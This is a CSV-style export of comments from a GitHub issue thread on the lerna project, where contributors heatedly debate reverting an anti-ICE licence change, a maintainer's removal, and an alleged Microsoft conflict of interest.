lerna/lerna/1639/417453569,"Re ""cooling off"" and ""people interested only in politics""... I'm seeing an extremely ill-informed opinion being bandied about that implies the current state of open source is apolitical. FSF was founded on some radically collectivist ideals. OSI on more radically libertarian ones. ""Open source principles"" are what they are because people planted the flag and did the work to make them that way. The reason this project is MIT instead of GPL in the first place is because of decades of ideological debate and changes in community expectations. Planting a different flag and doing a different thing is not more or less political than the status quo. To suggest otherwise is ahistorical nonsense. It's not more political; it's merely more participatory. I'm simultaneously intrigued by the effort to change the license and skeptical of what its effects might be. Maybe reverting was a good idea! It would have for sure been more interesting to see the experiment run its course, but I understand the fear to the health of the project that makes someone walk it back. Of course this attracted wider attention. Of course people who were otherwise mostly foreign to lerna were intrigued and came running. You were doing something mad and exciting and extremely political. A big project was finally taking an ethical question and putting it front and center and saying ""Yeah, it's time to talk about this."" Post-blowback, you don't wanna be political pioneers anymore. And who does? A) It's hard, and B) that's not how most of us want to spend our OSS time. If you're overwhelmed, frazzled, can't handle being the center of this ethical discussion you started, and just want to be left alone to code now... You could just say so? I mean that completely earnestly. It's okay to get in over your head and ask to be let back out. At least I think so. ",,False,False,1639
lerna/lerna/1639/417454263,@friend transparency for a decision comes from the people who made the decision. Right now what we have is You and I can quibble indefinitely over whether the things you posted are actually CoC violations. The point is neither of us are maintainers. ,,False,False,1639
lerna/lerna/1639/417455121,"@friend really amazing point. the fear seems to be if we open ourselves to political discussions how will we get our important professional work done.... but the very idea that open source/FSF is the domain where important money making professional work gets done, not where academic and politically radical weirdos hang out in their spare time, is pretty darn new. And that we're at this point it's the work of fairly intense political advocacy and organizing. ",,False,False,1639
lerna/lerna/1639/417459459,"Please have patience with me. I don't have a lot of spoons right now, between dealing with an unprecedented (for me) deluge of Twitter notifications and staving off suicidal ideation. ",,False,False,1639
lerna/lerna/1639/417460373,"FWIW @friend is right that Lerna is getting much attention, eg see this Vice motherboard news article. I did not know about this project myself till I saw the debate.  ",,False,False,1639
lerna/lerna/1639/417461491,"@friend Thank you for speaking up and registering your dissent and representing the dissent of like-minded Lerna users. As an open source project we have every right to provide no reason for his removal. However, as stewards of transparency, trust, and care for our users and the lerna ecosystem, we will provide clarity. According to the current Lerna Code of Conduct Additionally our rights as Org Members of the project for handling unacceptable behavior which do not align with the current Code of Conduct. These are the segments of the current lerna Code of Conduct that justify our decisions made to revoke all of James involvement and ownership privileges over this GitHub Organization. In multiple GitHub issues (if you need me to cite them, I will do so but in additional comments or edits from this response), on Twitter [important to note he claims ownership of lerna in this context making him profesionally represented and in the capacity of a maintainer] acts in a very unprofessional, rude, and harassing manner. These also have been occurring since July which @friend official states in our license change PR #1633 that we made a mistake in this regard to not address earlier violations in a swift and timely manner. As a core team, going forward, we want to not only protect the interest of the project itself, but also the transparency of the project. And that means we need to adopt a much less vague, less interpretive, and more structured Code of Conduct. For that we have open up #1636 per request (I on twitter officially asked Coraline to create this issue). On behalf of the core team who is all actively monitoring this issue, I hope it provides the clarity that you are seeking. Thank you for sticking up for a transparent and responsible process. Note @friend once you have your clarifications received (even if you don't explicitly request them), would you confirm your question has been answered? That way I can prevent thread abuse by locking and maintainers can add cited incidents in the issue. ",,False,False,1639
lerna/lerna/1639/417462982,Cannot speak for @friend or others but @friend I think where I need additional clarity is  Why did you decide to revert the license change despite maintainers having originally been involved in approving it? Why did you choose to link Jamie's dismissal with the license change? Why did you open a pull request to remove your own employer (Microsoft) from the restricted list?  ,,False,False,1639
lerna/lerna/1639/417464211," did he keep opening so many issues, harassing other people and why did he repeatedly refer to these free software projects that many people have contributed to as ""my tools""? Is all the code his property? Are all the contributions by everyone else worthless? ""I kinda hope they do try to keep using my tools though"" - From the motherboard article, emphasis added ""Also, stop using my tools (such as Babel)"" - from /palantir/tslint/issues/4132 Babel is his property as well? Can someone help my understand why these are his property? Thanks. ",,False,False,1639
lerna/lerna/1639/417468816,@friend Those questions aren't relevant to the thread. You'd have to ask Jamie himself. ,,False,False,1639
lerna/lerna/1639/417471514,"I did not decide to revert the license change, I approved it. This decision was made by @friend and his resoning is very clear in #1633. I did not link Jamie's dismissal. @friend explained his reasoning in #1633 I thought Microsoft was being treated unfairly and wanted to set the story straight. ",,False,False,1639
lerna/lerna/1639/417476331,@friend Those questions are relevant to the thread. Read the title of the thread. ,,False,False,1639
lerna/lerna/1639/417476606,"@friend I disagree that this is very clear ""the impact of this change was almost 100% negative, with no appreciable progress toward the ostensible goal aside from rancorous sniping and harmful drama."" The claims made here are not supported by evidence or arguments. This was the plural ""you"" here, as in ""you, the maintainers."" In any case, I still don't understand why Jamie's dismissal was linked as part of the same announcement, clearly implying that his dismissal had to do with his introduction of the modified MIT license. Respectfully, given the conflict of interest between your role as a maintainer and your role as a Microsoft employee, I think you should have sat out of that decision. It certainly appears to many as though your loyalty to your employer influenced the revert back to the old license. ",,False,False,1639
lerna/lerna/1639/417478662,It did not. Please stop repeating this baseless canard. ,,False,False,1639
lerna/lerna/1639/417479254,"@friend this is transparently absurd. You can't just say ""I'm not influenced by the company who pays me"" and thus make it so. I sometimes laugh at the Twitter refrain of ""tech workers need to be trained in ethics,"" but perhaps it's true. ",,False,False,1639
lerna/lerna/1639/417479261,"@friend If you're looking for ""rancorous sniping and harmful drama"" you might try using a mirror. ",,False,False,1639
lerna/lerna/1639/417479641,"Explain how me, the person who made the decision, not employed by Microsoft, was secretly paid by Microsoft to ruin open source. Should be an amusing story. ",,False,False,1639
lerna/lerna/1639/417480011,"You explicitly stated on Twitter that changes were being made after speaking with Sean, a Microsoft employee. If this isn't what happened, then what did happen is certainly hard to follow. ETA in case it's not clear I have never suggested you were secretly paid; that's not the point. ",,False,False,1639
lerna/lerna/1639/417481140,"I made the decision after speaking with Sean. It is possible to talk to somebody and then make an independent decision. If that's hard to believe, it's not my problem. ",,False,False,1639
lerna/lerna/1639/417481868,"@friend Feel free to show appreciable change as a result of this. At Amazon someone sent an email that said ""Don't use lerna above version v3.2.1"". I could just feel ICE crumbling under the pressure. Yes, only people with no vested interest in this can be involved in the decision making.  That makes a ton of sense. ",,False,False,1639
lerna/lerna/1639/417486430,"I would refer you to this comment. Up to you whether you consider this ""appreciable,"" but I suspect because you don't see direct, large results (e.g. MSFT didn't turn around and cancel its ICE contracts), you're not likely to consider this ""appreciable."" I personally think this action has definitely moved the needle on this issue. Court judges recuse themselves from decisions involving conflicts of interest all the time. The idea that one might have such a conflict and thus should not be involved in the decision is not particularly far-fetched. That said, I don't really have a problem with his involvement here. Sean is well-versed in open-source and would be worthwhile to consult regarding the impact of this decision. ",,False,False,1639
lerna/lerna/1639/417486905,"The damage has already been done. If the Lerna project was serious about its future after this trashing of it's credibility, it would strictly prohibit and immediately purge all social justice warriors from it's ranks. ",,False,False,1639
lerna/lerna/1639/417487240,"Because a guy among 10s of thousands was going to put up the big fight to stay off the list, and now can't because it doesn't exist anymore. I suppose, instead, he can now argue to not have contracts with ICE, but then this silly move wouldn't get any credit. Jamie already had a conflict of interest in targeting specific companies he didn't like. Your argument here would imply only people that are independent should play a role in the decision-making. Except nobody is independent. ",,False,False,1639
lerna/lerna/1639/417490645,"@friend I'm inclined to view this like a roach one person visible is indicative of a lot more you don't see. The point is that this caused at least one person to publicly say ""this resulted in me fighting to oppose ICE contracts."" I believe that's resulted in a lot more people than just him doing similar things. I know I've had a few conversations with people who hadn't previously considered the issue before this. That's not a conflict of interest. Judges don't recuse because of what they believe; they recuse themselves because they have a material interest in the result of the ruling, e.g. they've invested stocks in the companies involved. You're correct that nobody is independent, because no one is objective, but conflicts of interest and lack of independence are not synonymous.  All of that said, we're getting off topic from the purpose of the thread. I'm happy to continue this offline if you'd like. ",,False,False,1639
lerna/lerna/1639/417494363,"@friend I know you're dealing with a lot more than you expected right now but I'm afraid that as the maintainer of a project with a decently-sized community it really is your problem. I don't envy you it. I frankly don't know if it's even possible to clear it up completely at this point. At a charitable reading, @friend seems to have jumped in feet-first without thinking about what it looks like for a Microsoft employee to get involved in a situation which affects Microsoft's access (particularly given that Microsoft is in fact well known to have an active engagement with ICE, &amp; that the original license change didn't allow for equivocation about legacy systems). To be clear, this is how I think it went down too. I've met Sean and he cares a lot about open-source communities and open-source projects. But there are less charitable readings which are equally plausible from what's publicly known, or even just public on GitHub vs public on Twitter. You know as well as I do that ""big MS puts the screws to open-source project"" is a headline going back years and years, and Sean's involvement in any capacity with this chain of events means you've inadvertently leaned into that old stereotype. ",,False,False,1639
lerna/lerna/1639/417502379,"@friend I wish I could say your response made me feel discussion should be locked on this issue and consider it resolved. Unfortunately, it has the opposite effect for me. What I can see is  A change was made to the license that spoke ill of Microsoft was made that @friend approved of and merged  You, a Microsoft employee, attempted to remove Microsoft, and only Microsoft, from the list of companies in said change (I didn't know that part) @friend then spoke to you, a Microsoft employee, at length, after which the change was reverted. Speaking to you at length was specifically called in the decision to revert.  I am going to assume best intention that you genuinely feel calling out Microsoft was unfair, and you genuinely sought changes because of that, and not in an effort to protect your employer. However, as an employee of one of the companies that were called out in the change, clearly the ethical decision would be for you to recuse yourself from discussions of this issue completely. There's really no way in which you're a vaguely objective party -- or even if you are it's pretty reasonable for other people not to perceive you that way. My original issue (an RFC to reconsider the License) is not addressed, and moreover, I honestly suggest the right course for you all is for @friend to recuse himself from discussion going forward.  When I say ""ethically"" I purely speaking from what I think is right and in terms of staying impartial whenever one is given a governance role. My previous experience to being in tech is on non-profit boards, where for example, you would recuse yourself from any decision that might affect you personally as well as the organization. Obviously there is no legal duty in this case for an informal organization like Lerna *  ",,False,False,1639
lerna/lerna/1639/417516352,"I am in agreement that Sean does great work for the open source community and I'm really happy about what he's done with webpack. I know he cares a lot and means the best. In fact I'm confident every maintainer involved here cares a lot and had the best intentions. That said, I stand by Hannah's comment above. ",,False,False,1639
lerna/lerna/1639/417518550,"As an outsider (I've only ever just used Lerna once, ended up coming by because I smelled fire yesterday) This thread, from the outside, is a train wreck. It was opened -- with good intentions -- by someone external, when it should have been opened by someone in the team. It has turned into a means for @friend to be beaten with; at best, this is poor form, at worst, it's harassing the man. I agree with @friend w/r/t baseless canard. I'd honestly hope for better out of the free software community, but I guess the 90s never ended, and it is easier to accuse someone of horrible things than to give them benefit of the doubt. If the Lerna team members think he should recuse himself then that is their choice, but a lynch mob here serves no purpose other than to harass him. I'm going to suggest that this thread be restricted to members of the Lerna team; shy of that, closing this thread and opening one which is restricted to Learna team members. I agree transparency is important -- especially in @friend 's case. Right now, however, this is an issue for the lerna team to hash out and find a point where they feel it's settled to where the general internet can come and see what has happened, voice their thoughts, and a final choice can be made. ",,False,False,1639
lerna/lerna/1639/417521670,"It's funny how much of the argument is going on trying to express that you all have the same political views but you're too ignorant to really listen to each other. It's always jumping to conclusions that there must be conflicts of interest and conspiracy theories. At what point are people going to realize the arguing you're doing is for the most part wasting time trying to explain to someone, who agrees with you, why they should agree with you. Law is not based on feelings, licenses are law, licenses are not meant to be interpreted by feelings. Whatever they may be the license has to be rigid and precise, any lack thereof leaves the license weak and unenforceable. This isn't so much directed to the Lerna team as much as it is to every single person who is trying to ensure they're on the right side of history and bring the crusade Jamie was trying to create. ",,False,False,1639
lerna/lerna/1639/417524363,"I work at Amazon, should I also recuse myself from the discussion? This idea that employees of the company are too tainted to discuss the future of a project is absurd. If we want to debate the merits of this decision, which is how it should have gone in the first place, let's do so. But asking anyone to recuse themselves from discussion is the literal opposite of everything opensource is supposed to mean. This entire situation wouldn't exist if it weren't for some poor choices, and at least one of the maintainers realized that. Had this rash choice not been made in the first place, nobody would be here demanding that discussion take place and an RFC on taking Lerna to a non-opensource license would exist. I'm fine if the maintainers want to go that direction, but if I were in their position, my vote would be to close this issue and everybody go back to building software which is supposed to be the point of projects like this. But now that pandoras box has been opened, everyone with an agenda is here to fight for it, so much so, they want to silence anyone with an opinion that differs because ""ethics"" or whatever silly nonsense they can use to make this issue an echo chamber ",,False,False,1639
lerna/lerna/1639/417530197,"Ethics aren't silly, let's not trivialize them. Software engineers at VW who were asked by their management to implement defeat devices were held criminally liable for poor ethical decisions. ",,False,False,1639
lerna/lerna/1639/417530704,@friend If you can't see the difference between that and this situation then your opinion isn't that valid. ,,False,False,1639
lerna/lerna/1639/417531500,"Of course they're different - I'm pointing out that pooh-poohing ""ethical concerns"" as silly nonsense is is trollish. ",,False,False,1639
lerna/lerna/1639/417531889,"@friend You completely missed the point here. Silencing someone in the name of ethics isn't ethics. @friend explicitly stated that @friend shouldn't even be a part of the discussion for ethical reasons. That's abusing something good (ethics) for a clear agenda. That's after arguing that this discussion has some degree of immediacy so that a broad variety of opinions can be heard. Except, obviously, the opinions of the people that they are well aware disagree with them. It's either dishonest or naive. I choose to assume the latter as that requires the least assumption. But you're correct in that I'm going to call out anyone that tries to abuse something as meaningful as ethics, whether or not it was out of malice or poor judgement. ",,False,False,1639
lerna/lerna/1639/417532724,"Hey so I don't work at any of the companies involved or know any of the maintainers personally so I don't have any potential ethical dilemmas. Here's my thoughts The key part of the whole conflict of interest idea is that you have to be making a decision on behalf of a 3rd party, and the conflict would give rise to the appearance that you're being unduly influenced by this secondary consideration. I believe @friend made the decision. @friend had no conflict of interest, he's providing his input as a major stakeholder. As long as we all understand his role (and I think we do) then I think we'd be far richer for his input than not. This also makes the assumption that the rash &amp; unannounced decision to change the license was in the project's best interest, where one could easily argue that it was not for all the obvious reasons (community split, legal viability, no community feedback solicited, etc). Generally the notion that someone's involvement with an affected organization means that they can't speak from their expertise would cause all sorts of problems if it were applied to government. As much as lobbyists have (deservedly) earned a bad reputation, they also provide vital guidance to governments so they can make decisions that aren't destructive. So let's get everyone's best opinions in here, and then let the maintainers make their decision. ",,False,False,1639
lerna/lerna/1639/417535392,"I think this is mostly not accurate. As a maintainer Jamie had the ability to make changes and to persuade the other maintainers. When he made this decision to pursue goals that are unrelated to the project's unstated goal (make multi-package repos easy) he was arguably engaged in his own conflict of interest. That said if he was the only maintainer and decided that he was changing the project's goals, then he could not be in a conflict of interest because his goals and the project's were always aligned. ",,False,False,1639
lerna/lerna/1639/417538116,"Just for clarification, @friend is not the only Microsoft Employee who has been a part of this ongoing discussion which makes this even more distressing. ",,False,False,1639
lerna/lerna/1639/417538659,"@friend The only thing distressing is that this entire event took place. You do realize that the big tech companies even let us think for ourselves? I work for Amazon and not a single project in our org uses lerna. I do, personally. This wasn't about bias, this was about virtue signaling, particularly on such a terrible platform for it. Frankly I'm not sure where else this discussion has to go, since it's just boiling down to ""if you work for any of the companies listed you shouldn't have input"". ",,False,False,1639
lerna/lerna/1639/417551021,"Apologies if this is not an appropriate channel to voice opinions about the contents of the hypothetical RFC mentioned in the title of this issue, but assuming it is, I want to voice that I strongly disagree with the idea of applying Jamie's modified MIT license to Lerna. Not because it has anything to do with ICE, but due to the reasons cited here - TL;DR it would make Lerna fundamentally non-open-source. I think that people that want a fundamentally non-open-source licensed monorepo management project should be prepared to fork Lerna, find maintainers who agree with said non-open-source license, and potentially pay for its ongoing maintenance, rather than be questioning the decision of the mainline Lerna maintainers (namely, @friend who created the PR, as well as @friend and @friend who approved it). The Lerna maintainers are entirely within their rights to do as they please with Lerna. I'd also like to remind everyone involved that an RFC doesn't necessarily mean that dissenters will somehow be able to articulate an overwhelmingly convincing argument and magically overturn the maintainers' decision to retain the unmodified MIT license (or the decision to remove Jamie from the Lerna org). For better or worse, the maintainers are well aware now of the implications of what has transpired and trying to nitpick perceived flaws of logic is, at best, splitting hairs at this point. Lastly, @friend even if there a deluge of people accusing of you supporting political positions that you do not subscribe to, and that is taking an emotional toll on you, please remember that there are also those of us that understand your position on ICE, on OSS and on being publicly vulnerable. I personally believe your standing by the MIT license was the right move, and I'm not alone in thinking this. Stay strong. ",,False,False,1639
lerna/lerna/1639/417551038,"For left-leaning software devs who are interested in constructively affecting political change, please check out Tech For Campaigns at  , which pairs volunteer expert technologists with Democratic campaigns (even at the state and local level). I'm not affiliated. Using Palantir's open-source tools does serve as promotion / brand-awareness for a company that you might think has abhorrent practices and I do think that there should be room for opening tickets to request a different vendor on that basis alone. Or even a ticket on the open-source provider's repo to request transparency. But there is obviously a reasonable and an unreasonable way to go about that -- opening those issues was a clear waste of good reputation by somebody who could have made real waves with a more level-headed approach. Perhaps community input before big decisions is not a burden but actually serves to prevent bad decisions ",,False,False,1639
lerna/lerna/1639/417554305,"This whole thing has turned into a tire fire. ""If you don't support us entirely, you're against our cause"" is the most toxic thing ever. In my view, this hurts lerna's reputation. James Kyle's behavior is absolutely disgusting and I support his removal from this project. I'd also support levying a complaint with GitHub since he definitely violating their TOS, but I am not going to do that myself, but I definitely encourage those who were targeted to do so. I do support what was initially done, what needs to happen is that the license is crafted in a way that spells out everything. Make sure that it can't be challenged as being ambiguous. Ambiguity is your enemy here. I am also rather distressed that I was personally emailed and harassed and accused of supporting the disgusting policies of ICE. ICE needs to go and it can't be gone soon enough. Rather than being toxic -- which doesn't advance your cause -- it hurts your credibility because nobody wants to listen to you, consider trying to lobby the companies. I wish people would learn that the kind of stuff James Kyle pulled is absolutely disgusting and hurts the cause, which I support...it was just botched epically. ",,False,False,1639
lerna/lerna/1639/417554737,Also @friend and the other maintainers -- don't let this take an emotional toll on you -- there are people who do see why it happened the way it did. I'm rational and capable of seeing that what was there initially was horribly botched. I am however kind of curious why it was even approved in the first place? ,,False,False,1639
lerna/lerna/1639/417557907,"Also, one other thing Microsoft owns GitHub -- maybe make the change after moving to something like GitLab thinking which isn't owned by a company you explicitly excluded in your license... ",,False,False,1639
lerna/lerna/1639/417557974,"It's frustrating to engage in good faith and assume best intent of others, and get accused of, in the last several comments silencing, virtue signaling, abusing ethics to support an agenda, and engaging only to insure I'm on the right side of history (whatever that means), attempting to make an echo chamber, etc. I stated my own personal view of the ethical way to proceed most likely to maintain the trust of the community. I specifically posited it as a suggestion. Perhaps ethics is the wrong word -- maybe I mean ""best practice"". If it sounded judgemental I'm sorry. The echo chamber accusation sounds seems uniquely weird given this thread is 55 comments worth of multiple perspectives and disagreement.  I personally don't think it's a trash fire, but YMMV. It's specifically the kind of discussion I feel is needed, with people having to think about these questions discuss and disagree. ",,False,False,1639
lerna/lerna/1639/417559488,"@friend -- I'm regretting ever even entering this discussion as it's just caused me grief and emotional distress. I can't even imagine how @friend is feeling right now -- he has my support 100% -- some of us are rational. Most aren't necessarily against what happened, but HOW it happened. Even still, GitHub would be in their right to terminate James' account since he definitely violated the GitHub TOS. Bullying and harassment is not how you accomplish things. This is wrong and just horrible. I know there are others who got a similar email to the one I received and if you are feeling any distress, you have  my sympathies and such. This is a dumpster fire right now. ",,False,False,1639
lerna/lerna/1639/417559701,With the exception of a few trolls -- we all agree mostly...with a few people that have some conflicts of interest but I don't feel that they should be excluded from the discussion because of those. ,,False,False,1639
lerna/lerna/1639/417567438,"@friend in case it wasn't clear, while I disagree with your recommendation I'm confident it was made with the best of intentions and the goal of facilitating the best solution for all. ) ",,False,False,1639
lerna/lerna/1639/417654227,"Can you social justice warriors stop using (and hence promoting) this platform owned by a major ICE collaborator? Remember just like bad news is good news in show biz, any users and discussions on githib are (or will be in 4 momths) good news for MS. Only you enlightened people can kill Microsoft and consequently ICE in one fell swoop by altogether stopping using github. also somebody pointes out that except launch pad all other major git hosta are equally tainted- so id suggest using that as the signature list or whatever drama you will do next. ",,False,False,1639
lerna/lerna/1639/417654683,"If the Lerna community does decide to adopt a new licence in the future, I would like to encourage you to pick a licence that has been written and reviewed by lawyers. Regardless of political opinions, ideologies or agendas, copyright licences written by non-lawyers who are unlikely to fully understand the legal ramifications, or otherwise, of the clauses they include are likely not going to be accepted by the wider community of developers; nor the companies they work for that often have internal policies regarding acceptable open source licences for software they can use. The company I work for, and I can only assume many other companies, are taking a very close look at the licence Jamie wrote to understand the impact upon our own codebases. Lerna just happens to be the most high profile case of it being added, and so far the only case I'm aware of where it got reverted. It also got added to his other repositories and NPM packages, which remain a serious concern. I would also strongly advise against attempting to use a copyright licence for political protests against contemporary political issues. Software copyright licences are long-lived documents that can outlive any government-of-the-day that happens to be disrupting or upsetting certain groups of people. It's also likely to be an extremely ineffective, if not completely counter-productive, form of protest that can have potentially far reaching consequences beyond the intended goal, including setting a terrible precedent for the industry. Today, we get a list of companies rejected for working with a government agency carrying out extreme right wing policies. Tomorrow, we get another one from another group of people rejecting companies that support left wing policies. Where does it end? I urge those in the community advocating for either reinstating the licence or creating a new one in a similar vein to just pause and seriously think about what you're trying to achieve, what you can realistically achieve, and the costs of the way in which you attempt to achieve those goals. ",,False,False,1639
lerna/lerna/1639/417709039,"@friend just because there is dissent is not a good enough reason for there to be a discussion. RFCs are not meant to be vehicles for discussion for the sake of discussion. What matters is the arguments for or against a change, its pros and cons and determining actionable steps. A secondary point to consider is what has already happened. Dissenters will dissent and for many topics, there will never be consensus. Discussing endlessly in those cases is not only not fruitful, but distracting as well. As I understand, the arguments for a modified license are  support for the ideology of protesting against ICE, specifically desire for a voice in the decision process a legitimate desire to use a non-open-source license as a weapon to ""punish the bad guys"" (a view that seemed to be somewhat trollish in nature, from my observations, but I'm putting it here for completeness)  The arguments for keeping MIT  a custom license is restrictive not only to a blacklist, but also any company with a whitelist OSS license policy (i.e. any company of non-trivial size) it potentially sets a dangerous precedent that goes against the ideologies of OSS and FSF it isn't an appropriate - let alone effective - vehicle for political protest, given that actually disrupting ICE operations could at worst even delay reuniting children with their parents due to potential disruptions in logistics systems  Things I believe should not be part of the discussions re license  whether maintainers with conflict of interest should recuse themselves from discussion - the two most prolific Lerna contributors (other than Jamie) do not have conflict of interests and they agreed on the current decision. Whether maintainers decisions were influenced by one person or another should be of no consequence if they made a decision on their own free will. whether maintainers with conflict of interests should have recused themselves prior to the decision - an RFC isn't the place to debate the past, but to determined actionable items (if any) for the future whether more voices would change the decision - unless there are different arguments other than the ones I listed above, more commentary at this point is just going to be rehashes of the same ones that were taken into account the first time around.  ",,False,False,1639
lerna/lerna/1639/417711213,"Only you have suggested that these discussions are ""for the sake of discussion"". ",,False,False,1639
lerna/lerna/1639/417711654,It's also really weird to see so many people say  It's harmful to [foss|companies|people] I't not [going to work|effective|doing anything]  ,,False,False,1639
lerna/lerna/1639/417711904,I'll go ahead and suggest this is discussion for the sake of discussion as well. We certainly aren't talking about anything even remotely relevant to Lerna. ,,False,False,1639
lerna/lerna/1639/417712047,"Also, @friend @friend is there anything else you'd like to decide we shouldn't discuss? I might as well ask now, since you two are already providing answers. ",,False,False,1639
lerna/lerna/1639/417712597,"I never said it shouldn't or couldn't be discussed, I said it was discussion for the sake of discussion. Relax buddy, and read what people write before you respond. ",,False,False,1639
lerna/lerna/1639/417738137,"It's still funny the discussion is primarily ""If you don't revert it you are complacent with separating families!"". Which is a stupid untrue argument. @friend You're providing equal values of absolutely nothing to this discussion. ",,False,False,1639
lerna/lerna/1639/417766868,"You laid out opinions. You can't just declare a comment to be a ""opinion"" and have it be so. Come on, now. ""An RFC is authored by engineers and computer scientists in the form of a memorandum describing methods, behaviors, research, or innovations applicable to the working of the Internet and Internet-connected systems. It is submitted either for peer review or to convey new concepts, information"" * ""Peer review methods are employed to maintain standards of quality, improve performance, and provide credibility""** I'm more than happy to remove this from the argument list if you think it's not one, though I understand it to be the primary motivation behind the original change by Jamie. It's a fact that engineers in my company would not be able to use software with such a license, for example. There are precedents documented elsewhere for React's old license as well. Yes, as I said, I prefaced those with ""Things I believe should not be part of the discussion"". Those are my opinions. If I may be blunt, it feels like you're acting in bad faith, and I've no interest in drama. @friend ",,False,False,1639
lerna/lerna/1639/417745077,"@friend I laid out the factual arguments both pro and against the question of whether Lerna should be MIT or not. I also clearly prefaced my personal opinions as being my opinions. If you're only interested in making ad-hominen arguments, you're not adding to the discussion. To be clear, my intention was not to dictate, but to spell out reasons why some forms of commentary are not fruitful in the context of what an RFC is typically designed for. You are more than welcome to make new arguments, if you have them, as long as they are on topic. To that end, I'm going to repeat what I believe is the most important argument to this discussion if you agree with the tenet that a non-MIT license will have any impact whatsoever on ICE, it follows that doing so may have a negative impact due to its indiscriminate and non-surgical nature. In other words, disrupting ICE operations can delay families from being reunited. I don't believe even the most hardcore proponent of the non-MIT license can say in good conscience and good faith that unintended damage to the very cause it purports to serve is not a real possibility, and I think that reason alone should be enough for everyone to support the current decision. ",,False,False,1639
lerna/lerna/1639/417773118,@friend  ,,False,False,1639
lerna/lerna/1639/417756795,"You laid out opinions. You can't just declare a comment a ""factual argument"" and have it be so. Opinion. Opinion. Opinion Opinion. Opinion. Opinion. Opinion. ",,False,False,1639
lerna/lerna/1639/417788117,I'm confident benwiley4000 and krainboltgreene are just trolling at this point. Don't give them the effort of a response. ,,False,False,1639
lerna/lerna/1639/417787981,@friend You really wanna stick it to Microsoft? Delete your GitHub account. Better yet -- move the repository off of GitHub! They're soon going to be its owner. ,,False,False,1639
lerna/lerna/1639/417818782,"I want to start by saying that I agree that the license changes, as were initially implemented, were objectively poor and probably unenforceable from a legal perspective, and that it is probably justified to revert at least until a suitable replacement could be drafted and reviewed. What concerns me are a few things, however. First, the sentence from @friend in #1633 The very fact that there was a huge amount of drama and publicity around this change signifies that it is important and that it did affect appreciable progress. There was never any delusion, as far as I could tell, by those who supported this change, that this single license change would have ICE quake in their boots, as has been suggested to be the measure of what ""affecting change"" would be by many. However, it could have served as a stepping stone and a beacon which other projects could use, and eventually create change not only in relation to ICE directly but to the notion of ethics in open source coding and licenses. @friend I haven't seen anyone use this as an argument in this entire thread actually, so I'm not sure where you're getting that this discussion is ""primarily"" about that. @friend I think this is fairly silly--as has been alluded in other posts in this thread, Open Source licenses are exactly what you are arguing against -- political protests against contemporary political issues. These were seen as ridiculous not long ago in history, and are only recently gaining widespread approval. Just because they are now the status quo for many large pieces of software doesn't mean they are particularly old, and the fact is that they were very political pieces of activism, especially in the time when they were first being penned. @friend I believe this is exactly why we want an RFC -- to discuss whether this change (or one like it) should be implemented or not. And I believe this is also what @friend meant by ""discussion is needed,"" not just ""discussion for the sake of discussion"". I don't believe that this intention is at all trollish, though the way you present it makes it sound slightly so. The idea is that we can use software and the control over we have over the software we write, one of which is the license of who gets to use it, in order to affect change in the world. You may say that this is political, but I would argue that by taking no action, you are in fact taking an action and affecting change. We must battle with which one is more positive or has a better ethical standing. I believe that this is a perfectly legitimate thing to do. However, as I said in the beginning, in the case of a license it does need to be more premediated and thought out because of the nature of legality and enforcement. This assumes that any movement against ICE is inherently bad because it assumes that the short term negative impact would out weigh any long term benefit of having ICE gone. It also ignores the potential ways in which there would be benefits throughout the entire software development and sharing community, as I mentioned near the top of my post. I believe that this argument is somewhat of a non-starter, as it asserts that ""open source"" is fundamentally better than ""not open source."" It also asserts that those definitions of ""open source"" are the correct ones and are not open for discussion. I think this is somewhat silly however, as what is and is not open source has been malleable and changed before, and I don't think it is out of the question for it to change again. ",,False,False,1639
lerna/lerna/1639/417819481,"The ""you're either with us entirely or you're against us"" is disgusting. There's also this. I got a similar message from the same Ryan White guy. Stop this behavior. Grow up. Wanting a better solution doesn't mean we're in favor of what ICE is doing. This change was slacktivism at its finest. Wanna really stick it to MS, get off of GitHub. Delete your accounts now, Microsoft is going to be the owner of GitHub. It was symbolic at best, and even that was kind of laughable. If you don't delete your GitHub and are still trying to argue that this change being reverted is somehow endorsing what ICE is doing, guess what -- so does having a GitHub account if you're trying to use that argument, your credibility was just shattered. ",,False,False,1639
lerna/lerna/1639/417819908,"The ""you're either with us entirely or you're against us"" is disgusting. There's also this. I got a similar message from the same Ryan White guy. Stop this behavior. Grow up. Wanting a better solution doesn't mean we're in favor of what ICE is doing. This change was slacktivism at its finest. Wanna really stick it to MS, get off of GitHub. Delete your accounts now, Microsoft is going to be the owner of GitHub. It was symbolic at best, and even that was kind of laughable. If you don't delete your GitHub and are still trying to argue that this change being reverted is somehow endorsing what ICE is doing, guess what -- so does having a GitHub account if you're trying to use that argument, your credibility was just shattered. ",,False,False,1639
lerna/lerna/1639/417820268,Also -- if you use Windows -- might I suggest not using it anymore? ,,False,False,1639
lerna/lerna/1639/417823487,"Oh boy... @friend The mentions of reverting to the original MIT license has been met with this statement enough times in enough issues, twitter, and reddit. It's not word for word what is said but it is heavily implied by ""you support what ICE does"". No, it's a terrible idea. Any restriction on the license means it's no longer open source. If that's the goal then I think a lot of people will just drop Lerna because of licensing risk. If that's what you want just to make a statement then that's a very poor software decision. It was entirely a trollish act, it's undebatable. 👈 Multiple links The ethical standing is to honor an open license. If lerna doesn't want to be an open source project anymore that's a different story. You cannot restrict anyone. The discussion that everyone seems to be missing is that this change converts Lerna to a proprietary piece of software. Also you're nearing the ethical dilemma of the trolley problem, not exactly, but by saying ""inaction is an action in itself"" is a  poor argument. ICE isn't going anywhere and it probably won't in the next 10 years. Whether that is a positive or negative to whoever reads this is an unfortunate thing we have to deal with. I'm 99.9% sure lerna is nothing special at a government scale, and if ICE (or company in a binding contract with ICE) needed something like lerna they'd build it themselves or simply fork the old version. This license change effectively does nothing to the target. So the discussion is resulting in debating who can virtue signal the strongest. This is a fundamental misunderstanding of what ""open"" means if one cannot see the issue with a non-open license. You will have to fight the literally brick wall of Stallman to change what ""open"" source means if you want to challenge this. Non open licenses greatly increase risk of using the software (depending on the license, the bastardization of the MIT-ICE is a huge risk). If you want to build a company you simply don't pick licenses which can destroy your business in a day. In what realm of reality does a strictly always open door, close? Open is open, closed is closed. Open source is non discriminatory, if you want to go down the path of ""restrictive licensing is open source"" then I don't see the issue with Facebook being able to restrict the people using React under their Patent license. Absolutely zero issues with a single entity controlling who uses the software while claiming to be open source. ",,False,False,1639
